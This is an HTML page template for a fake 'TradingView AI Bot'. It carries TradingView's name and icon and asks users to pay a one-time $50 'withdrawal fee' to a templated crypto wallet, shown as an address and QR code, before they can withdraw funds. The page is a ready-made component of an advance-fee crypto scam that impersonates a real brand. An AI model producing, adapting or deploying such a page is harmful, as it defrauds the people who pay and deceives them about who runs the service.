<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pay Withdrawal Fee - TradingView AI Bot</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="icon" href="https://tradingview.com/favicon.ico">
</head>
<body class="bg-gray-900 text-white">
    <div class="container mx-auto p-4 max-w-md">
        <div class="flex items-center justify-center mb-6">
            <img src="https://tradingview.com/favicon.ico" alt="TradingView" class="h-8 w-8 mr-3">
            <h1 class="text-2xl font-bold">Pay Withdrawal Fee</h1>
        </div>

        <div class="bg-gray-800 rounded-lg p-6">
            <div class="text-center mb-6">
                <div class="bg-yellow-500 text-white p-4 rounded-lg mb-4">
                    <h2 class="text-xl font-bold">üí≥ One-Time Withdrawal Fee: $50</h2>
                    <p class="text-sm mt-2">Pay this fee once to enable unlimited withdrawals</p>
                </div>
            </div>

            <div class="bg-gray-700 p-4 rounded-lg mb-6">
                <p class="text-center font-mono text-sm break-all mb-4">{{ wallet }}</p>
                <div class="flex justify-center mb-4">
                    <img src="data:image/png;base64,{{ qr_code }}" alt="QR Code" class="w-48 h-48 border-4 border-white rounded-lg">
                </div>
                <p class="text-center text-yellow-400 text-sm">Scan QR code or copy wallet address above</p>
            </div>

            <form method="POST">
                <button type="submit" 
                        class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-4 rounded-lg transition duration-300">
                    ‚úÖ I Have Paid the $50 Fee
                </button>
            </form>

            <div class="mt-4 text-center">
                <a href="/withdraw" class="text-green-400 hover:text-green-300">‚Üê Back to Withdrawal</a>
            </div>
        </div>
    </div>
</body>
</html>
